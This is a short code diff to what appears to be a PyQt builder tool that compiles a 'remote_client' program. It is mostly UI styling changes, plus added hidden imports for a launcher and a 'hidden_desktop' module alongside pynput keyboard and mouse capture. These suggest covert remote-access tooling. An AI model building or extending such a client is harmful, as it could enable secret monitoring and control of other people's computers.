@@ -15,7 +15,7 @@ from ...core.i18n import I18n
 from ...core.logging import EventLogger
 from ...core.theme import THEMES
 from ...core.settings import SettingsStore
-from ..common import make_button
+from ..common import GlassFrame, make_button
 
 
 @dataclass
@@ -269,6 +269,9 @@ class BuilderWorker(QtCore.QThread):
             "pynput",
             "pynput.mouse",
             "pynput.keyboard",
+            "remote_client.apps",
+            "remote_client.apps.launcher",
+            "remote_client.windows.hidden_desktop",
         ]
         for module in hidden_imports:
             args.extend(["--hidden-import", module])
@@ -380,14 +383,14 @@ class CompilerPage(QtWidgets.QWidget):
 
         header = QtWidgets.QVBoxLayout()
         self.title_label = QtWidgets.QLabel()
-        self.title_label.setStyleSheet("font-size: 20px; font-weight: 700;")
+        self.title_label.setObjectName("PageTitle")
         self.subtitle_label = QtWidgets.QLabel()
-        self.subtitle_label.setObjectName("Muted")
+        self.subtitle_label.setObjectName("PageSubtitle")
         header.addWidget(self.title_label)
         header.addWidget(self.subtitle_label)
         layout.addLayout(header)
 
-        form_card = QtWidgets.QFrame()
+        form_card = GlassFrame(radius=20, tone="card", tint_alpha=170, border_alpha=70)
         form_card.setObjectName("Card")
         form_layout = QtWidgets.QGridLayout(form_card)
         form_layout.setHorizontalSpacing(16)
@@ -473,7 +476,7 @@ class CompilerPage(QtWidgets.QWidget):
         actions.addWidget(self.status_label)
         layout.addLayout(actions)
 
-        log_card = QtWidgets.QFrame()
+        log_card = GlassFrame(radius=20, tone="card", tint_alpha=170, border_alpha=70)
         log_card.setObjectName("Card")
         log_layout = QtWidgets.QVBoxLayout(log_card)
         self.log_output = QtWidgets.QPlainTextEdit()
